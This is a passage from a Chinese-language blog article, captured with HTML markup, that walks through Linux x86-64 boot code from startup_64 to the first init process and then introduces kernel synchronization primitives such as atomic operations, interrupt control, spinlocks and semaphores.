0x1000(%ebx), %edileal0x1007(%edi), %eaxmovl$4, %ecx1:movl%eax, 0x00(%edi)addl$0x00001000, %eaxaddl$8, %edidecl%ecxjnz1b/* Build Level 2 */lealpgtable + 0x2000(%ebx), %edimovl$0x00000183, %eaxmovl$2048, %ecx1:movl%eax, 0(%edi)addl$0x00200000, %eaxaddl$8, %edidecl%ecxjnz1b/* Enable the boot page tables */lealpgtable(%ebx), %eaxmovl%eax, %cr3/* Enable Long mode in EFER (Extended Feature Enable Register) */movl$MSR_EFER, %ecxrdmsrbtsl$_EFER_LME, %eaxwrmsr/* After gdt is loaded */xorl%eax, %eaxlldt%axmovl    $__BOOT_TSS, %eaxltr%ax/* * Setup for the jump to 64bit mode */pushl$__KERNEL_CS/* 将内核段代码地址入栈 */lealstartup_64(%ebp), %eax/* 将 startup_64 的地址导入 eax */#......pushl%eax/* 入栈 *//* Enter paged protected Mode, activating Long Mode */movl$(X86_CR0_PG | X86_CR0_PE), %eax /* Enable Paging and Protected mode */movl%eax, %cr0/* Jump from 32bit compatibility mode into 64bit mode. */lret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 <code>lret</code> 指令之后，CPU 取出了之前入栈的 <code>startup_64</code> 地址跳转到那里</p></blockquote></li></ul><h4 id="startup-64函数">startup_64函数</h4><ul><li><p>定义在 arch/x86/boot/compressed/head64.S<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p></li><li><p>初始化长模式下数据段寄存器，确定最终解压缩地址，初始化栈</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.code64.org 0x200ENTRY(startup_64)#....../* Setup data segments. */xorl%eax, %eaxmovl%eax, %dsmovl%eax, %esmovl%eax, %ssmovl%eax, %fsmovl%eax, %gs/* 计算内核编译时的位置和它被加载的位置的差 */#ifdef CONFIG_RELOCATABLEleaqstartup_32(%rip) /* - $startup_32 */, %rbp/* rbp 包含 startup_32 物理地址 */movlBP_kernel_alignment(%rsi), %eaxdecl%eaxaddq%rax, %rbpnotq%raxandq%rax, %rbpcmpq$LOAD_PHYSICAL_ADDR, %rbpjae1f#endifmovq$LOAD_PHYSICAL_ADDR, %rbp1:/* Target address to relocate to for decompression */movlBP_init_size(%rsi), %ebxsubl$_end, %ebxaddq%rbp, %rbx/* rbx 包含内核代码重定位以进行解压缩的地址 *//* 栈指针的设置 */leaqboot_stack_end(%rbx), %rsp/* 标志寄存器的重置 */pushq$0popfq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>拷贝压缩的内核到解压地址并跳转到解压代码处</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">/* * 复制压缩的内核到解压了的内核重定位地址 */pushq%rsi/* 保存rsi的值，存放指向boot_params的指针 *//* 压缩的内核映像位于当前代码和解压缩代码之间，将bss段之前的都拷贝到新的位置 */leaq(_bss-8)(%rip), %rsileaq(_bss-8)(%rbx), %rdimovq$_bss /* - $startup_32 */, %rcxshrq$3, %rcxstdrepmovsq/* 每次8字节地从 rsi 到 rdi 复制代码 */cld/* 清除DF标志 */popq%rsi/* * 跳转到重定位后的地址 */leaqrelocated(%rbx), %rax/* 有.text节的重定位后的地址 */jmp*%rax.textrelocated:#......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>内核解压</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">/* * Do the extraction, and jump to the new kernel.. */pushq%rsi/* Save the real mode argument */movq%rsi, %rdi/* real mode address */leaqboot_heap(%rip), %rsi/* malloc area for uncompression */leaqinput_data(%rip), %rdx  /* input_data */movl$z_input_len, %ecx/* input_len */movq%rbp, %r8/* output target address */movq$z_output_len, %r9/* decompressed length, end of relocs */callextract_kernel/* returns kernel location in %rax */popq%rsi/* * Jump to the decompressed kernel. */jmp*%rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>最后一条指令 <code>jmp *rax</code> 中的 rax 保存就是 extract_kernel 函数返回的入口点，就是从这里开始进入了 Linux 内核</p></blockquote></li></ul><h4 id="extract-kernel函数">extract_kernel函数</h4><ul><li><p>在 linux/arch/x86/boot/compressed/misc.c 文件中定义，解压内核的函数，根据 piggy.o 中的信息从 vmlinux.bin.gz 中解压出 vmlinux 并解析elf格式</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">asmlinkage __visible <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extract_kernel</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>rmode<span class="token punctuation">,</span> memptr heap<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>input_data<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> input_len<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>output<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> output_len<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> kernel_total_size <span class="token operator">=</span> VO__end <span class="token operator">-</span> VO__text<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> virt_addr <span class="token operator">=</span> LOAD_PHYSICAL_ADDR<span class="token punctuation">;</span><span class="token comment">//......</span><span class="token function">debug_putstr</span><span class="token punctuation">(</span><span class="token string">"\nDecompressing Linux... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用具体的解压缩算法解压</span><span class="token function">__decompress</span><span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> input_len<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> output_len<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解压出的vmlinux是elf格式，解析出里面的指令数据段和常规数据段</span>    <span class="token comment">//返回内核程序的开始地址</span>    <span class="token function">parse_elf</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//只有在启用了CONFIG_RANDOMIZE_BASE配置选项才会调用，函数会调整内核镜像的地址</span><span class="token function">handle_relocations</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> output_len<span class="token punctuation">,</span> virt_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">debug_putstr</span><span class="token punctuation">(</span><span class="token string">"done.\nBooting the kernel.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> output<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="进入Linux内核">进入Linux内核</h3><h4 id="Linux内核的startup-64">Linux内核的startup_64</h4><ul><li><p>startup_64 函数定义在 linux/arch/x86/kernel/head_64.S 文件中，它是<strong>内核的入口函数</strong></p></li><li><p>内核执行的第一步，完成了一些初步的检查</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__HEAD.code64.globl startup_64startup_64:#....../* * 计算内核的物理基址与实际加载地址的差，0 代表内核被加载到了默认地址 */leaq_text(%rip), %rbpsubq$_text - __START_KERNEL_map, %rbp/* 检查这个地址是否已经正确对齐 */testl$~PMD_PAGE_MASK, %ebpjnzbad_address/* * 检查高 18 位来防止这个地址过大 */leaq_text(%rip), %raxshrq$MAX_PHYSMEM_BITS, %raxjnzbad_address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修正页表基地址</p></li><li><p>Identity Map Paging</p></li><li><p>secondary_startup_64</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ENTRY(secondary_startup_64)#......1:/* Enable PAE and PSE, but defer PGE until kaiser_enabled is decided */movl$(X86_CR4_PAE | X86_CR4_PSE), %ecxmovq%rcx, %cr4/* Setup early boot stage 4 level pagetables. */addqphys_base(%rip), %raxmovq%rax, %cr3#....../* 跳转到C语言代码 */movqinitial_code(%rip),%rax# initial_code 包含 x86_64_start_kernel 的地址pushq$0# fake return address to stop unwinderpushq$__KERNEL_CS# set correct cspushq%rax# target address in negative spacelretqENDPROC(secondary_startup_64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>SMP系统加电之后，总线仲裁机制会选出多个CPU中的一个，称为BSP，BSP CPU先启动，其它CPU则等待BSP CPU的唤醒，对于第一个启动的CPU，会跳转 secondary_startup_64 函数中1标号处，对于其它被唤醒的CPU则会直接执行 secondary_startup_64 函数</p></blockquote></li></ul><h4 id="Linux内核的第一个C函数">Linux内核的第一个C函数</h4><ul><li><p><strong>x86_64_start_kernel</strong> 在 arch/x86/kernel/head64.c 文件中定义，函数接受一个参数 real_mode_data（bootparam 结构的地址），之前保存到了 rdi 寄存器中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">asmlinkage __visible <span class="token keyword">void</span> __init <span class="token function">x86_64_start_kernel</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> real_mode_data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token comment">/* * 检查 */</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span>MODULES_VADDR <span class="token operator">&lt;</span> __START_KERNEL_map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span>MODULES_VADDR <span class="token operator">-</span> __START_KERNEL_map <span class="token operator">&lt;</span> KERNEL_IMAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span>MODULES_LEN <span class="token operator">+</span> KERNEL_IMAGE_SIZE <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token operator">*</span>PUD_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__START_KERNEL_map <span class="token operator">&amp;</span> <span class="token operator">~</span>PMD_MASK<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span><span class="token punctuation">(</span>MODULES_VADDR <span class="token operator">&amp;</span> <span class="token operator">~</span>PMD_MASK<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>MODULES_VADDR <span class="token operator">&gt;</span> __START_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>MODULES_END <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> PGDIR_MASK<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token punctuation">(</span>__START_KERNEL <span class="token operator">&amp;</span> PGDIR_MASK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BUILD_BUG_ON</span><span class="token punctuation">(</span><span class="token function">__fix_to_virt</span><span class="token punctuation">(</span>__end_of_fixed_addresses<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> MODULES_END<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">cr4_init_shadow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Kill off the identity-map trampoline */</span><span class="token function">reset_early_page_tables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//重新设置早期页表</span><span class="token function">clear_bss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清理BSS段</span><span class="token function">clear_page</span><span class="token punctuation">(</span>init_level4_pgt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清理之前的顶层页目录</span><span class="token function">kasan_early_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//设置并加载 IDT</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_EXCEPTION_VECTORS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token function">set_intr_gate</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> early_idt_handler_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">load_idt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">desc_ptr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>idt_descr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">copy_bootdata</span><span class="token punctuation">(</span><span class="token function">__va</span><span class="token punctuation">(</span>real_mode_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//复制引导信息</span><span class="token comment">/* * Load microcode early on BSP. */</span><span class="token function">load_ucode_bsp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加载BSP CPU的微码</span><span class="token comment">/* set init_level4_pgt kernel high mapping*/</span>init_level4_pgt<span class="token punctuation">[</span><span class="token number">511</span><span class="token punctuation">]</span> <span class="token operator">=</span> early_level4_pgt<span class="token punctuation">[</span><span class="token number">511</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//让顶层页目录指向重新设置早期页表</span><span class="token function">x86_64_start_reservations</span><span class="token punctuation">(</span>real_mode_data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> __init <span class="token function">x86_64_start_reservations</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>real_mode_data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//......</span><span class="token function">start_kernel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="start-kernel函数">start_kernel函数</h4><ul><li><p>start_kernel 函数定义在 init/main.c 文件，其中调用了大量 Linux 内核功能的初始化函数：ARCH、日志、陷阱门、内存、调度器、工作队列、RCU锁、Trace事件、IRQ中断、定时器、软中断、ACPI、fork、缓存、安全、pagecache、信号量、cpuset、cgroup等等</p></li><li><p>start_kernel 函数执行完成，内核就具备了向应用程序提供一系列功能服务的能力</p></li><li><p>最后调用 rest_init()，重要功能是建立了两个内核线程<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，Linux 内核线程可以执行一个内核函数， 只不过这个函数有独立的线程上下文，可以被Linux的进程调度器调度，对于 kernel_init 线程来说，执行的就是 kernel_init 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">void</span> __ref <span class="token function">rest_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> pid<span class="token punctuation">;</span>    <span class="token comment">//建立 kernel_init 线程，pid=1（kernel_thread 调用 _do_fork 创建进程）</span><span class="token function">kernel_thread</span><span class="token punctuation">(</span>kernel_init<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CLONE_FS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立 khreadd 线程，pid=2，负责所有内核线程的调度和管理</span>    pid <span class="token operator">=</span> <span class="token function">kernel_thread</span><span class="token punctuation">(</span>kthreadd<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CLONE_FS <span class="token operator">|</span> CLONE_FILES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//......</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="Linux的第一个用户进程">Linux的第一个用户进程</h3><ul><li><p>Linux 内核的第一个用户态进程是在 kernel_init 线程建立的，kernel_init 线程执行的就是 <code>kernel_init</code> 函数</p></li><li><p>根据内核启动参数，调用 run_init_process 创建对应进程</p></li><li><p>调用 try_to_run_init_process 函数，尝试以 /sbin/init、/etc/init、/bin/init、/bin/sh 这些文件为可执行文件建立 init 进程，只要其中之一成功就可以，当从系统调用返回用户态时，init进程（1号进程）就从 ELF 执行了</p></li></ul><ol><li></li></ol><ol><li></li></ol><h2 id="03-Linux同步机制">03 | Linux同步机制</h2><h3 id="概述-6">概述</h3><h4 id="场景及解决">场景及解决</h4><ul><li><p>场景：在驱动程序中，有些设备只允许打开一次</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> xxx_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//驱动中的全局变量，表示打开的标志</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>xxx_count<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span> <span class="token comment">//打开失败</span>    <span class="token punctuation">}</span>    <span class="token operator">++</span> xxx_count<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//打开成功</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>假如一个进程A先对此设备调用open，另一个进程B也对此设备调用open，若调度如下，A和B两个进程都可以成功打开驱动</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-sample.png" alt=""></p></li><li><p>并发执行的单元对共享资源的同时访问会引发竞态问题，解决途径是保证对共享资源的<strong>互斥访问</strong>，访问共享资源的代码区块叫做临界区</p></li><li><p>要解决上述场景中的问题，有这样两种思路：一种是使用<strong>原子操作</strong>，这里的原子是不可分隔的，要么不执行，要么执行完；另一种是<strong>控制中断</strong>，在执行之前关中断，执行完之后开中断</p></li><li><p>原子操作，在只有<strong>单个变量全局数据</strong>的情况下非常实用，如全局计数器、状态标志变量等</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">atomic_add</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>        __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"lock;"</span> <span class="token string">"addl %1,%0"</span>                     <span class="token operator">:</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>a_count<span class="token punctuation">)</span>                     <span class="token operator">:</span> <span class="token string">"ir"</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//"lock;" "addl %1,%0" 是汇编指令部分，%1,%0是占位符，它表示输出、输入列表中变量或表态式，占位符的数字从输出部分开始依次增加，这些变量或者表态式会被GCC处理成寄存器、内存、立即数放在指令中。 </span><span class="token comment">//: "+m" (v-&gt;a_count) 是输出列表部分，“+m”表示(v-&gt;a_count)和内存地址关联</span><span class="token comment">//: "ir" (i) 是输入列表部分，“ir” 表示i是和立即数或者寄存器关联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>中断控制搞定复杂变量</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> u32_t cpuflg_t<span class="token punctuation">;</span><span class="token comment">//关闭中断</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">hal_save_flags_cli</span><span class="token punctuation">(</span>cpuflg_t<span class="token operator">*</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>     __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span>            <span class="token string">"pushfl \t\n"</span> <span class="token comment">//把eflags寄存器压入当前栈顶</span>            <span class="token string">"cli    \t\n"</span> <span class="token comment">//关闭中断</span>            <span class="token string">"popl %0 \t\n"</span><span class="token comment">//把当前栈顶弹出到flags为地址的内存中        </span>            <span class="token operator">:</span> <span class="token string">"=m"</span><span class="token punctuation">(</span><span class="token operator">*</span>flags<span class="token punctuation">)</span>            <span class="token operator">:</span>            <span class="token operator">:</span> <span class="token string">"memory"</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//开启中断</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">hal_restore_flags_sti</span><span class="token punctuation">(</span>cpuflg_t<span class="token operator">*</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span>            <span class="token string">"pushl %0 \t\n"</span><span class="token comment">//把flags为地址处的值寄存器压入当前栈顶</span>            <span class="token string">"popfl \t\n"</span>   <span class="token comment">//把当前栈顶弹出到flags寄存器中</span>            <span class="token operator">:</span>            <span class="token operator">:</span> <span class="token string">"m"</span><span class="token punctuation">(</span><span class="token operator">*</span>flags<span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token string">"memory"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>自旋锁</p><ul><li>在多核心 CPU 上通过控制中断来维护全局数据安全的方案失效了，同一时刻下系统中存在多条代码执行流，控制中断只能控制本地CPU的中断，无法控制其它CPU核心的中断</li><li>自旋锁同步机制：若自旋锁已被别的执行者保持，调用者就会原地循环等待并检查该锁的持有者是否已经释放锁（即进入自旋状态），若释放则调用者开始持有该锁</li><li>自旋锁必须保证<strong>读取锁变量和判断并加锁的操作是原子执行的</strong>（CAS），x86 CPU提供原子交换指令<code>xchg</code>，可以让寄存器中的一个值与内存空间中的一个值交换</li></ul></li><li><p>信号量</p><ul><li>自旋锁都不适合长时间等待的情况，会导致CPU忙等待</li><li>信号量是1965年荷兰学者<em>Edsger Dijkstra</em>提出的，是一种用于资源互斥或者进程间同步的机制，信号量既能对资源数据进行保护，又能在资源无法满足的情况下让CPU可以执行其它任务，同时解决了<strong>等待、互斥、唤醒</strong>三个问题</li></ul></li></ul><h4 id="Linux内核同步机制">Linux内核同步机制</h4><ul><li><p>原子操作</p></li><li><p>控制中断</p></li><li><p>信号量（semaphore）</p></li><li><p>读写信号量（rw_semaphore）</p></li><li><p>spinlock</p></li><li><p>mutex</p></li><li><p>BKL（Big Kernel Lock，只在2.4内核中）</p></li><li><p>rwlock</p></li><li><p>brlock（只在2.4内核中）</p></li><li><p>RCU（2.6及以后的版本中）</p></li><li><p>seqlock（2.6及以后的版本中）</p></li><li><p>qspinlock</p><p>…<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p></li></ul><br><h3 id="atomic">atomic</h3><h4 id="使用">使用</h4><ul><li><p>原子操作指执行结束前不可打断的操作，是最小的执行单位</p></li><li><p>原子变量 atomic 适用于针对 int 变量进行同步的场景</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">static</span> atomic_t can_open <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/**结构体:typedef struct {int counter; //常用的32位的原子变量类型} atomic_t;初始化:#define ATOMIC_INIT(i){ (i) }**/</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">atomic_dec_and_test</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"dev is busy, hello_open fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>flip<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close ok\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>API：以ARM平台为例</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220717-arm-atomic-api.png" alt=""></p></li></ul><h4 id="atomic内核源码">atomic内核源码</h4><ul><li><p>原子操作与硬件架构强相关</p></li><li><p>x86</p> <pre class="line-numbers language-c" 